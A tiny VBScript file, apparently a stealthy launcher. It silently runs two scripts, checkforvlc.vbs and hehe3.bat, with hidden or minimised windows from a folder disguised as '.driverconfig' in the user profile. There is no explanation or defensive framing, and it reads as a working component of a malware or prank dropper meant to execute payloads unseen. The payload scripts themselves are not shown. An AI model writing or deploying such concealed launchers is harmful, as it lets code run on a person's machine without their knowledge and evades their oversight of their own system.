Set objShell = CreateObject("WScript.Shell")

objShell.Run "cmd /c start /min wscript %USERPROFILE%\.driverconfig\checkforvlc.vbs", 0, True
objShell.Run "cmd /c %USERPROFILE%\.driverconfig\hehe3.bat", 0, False
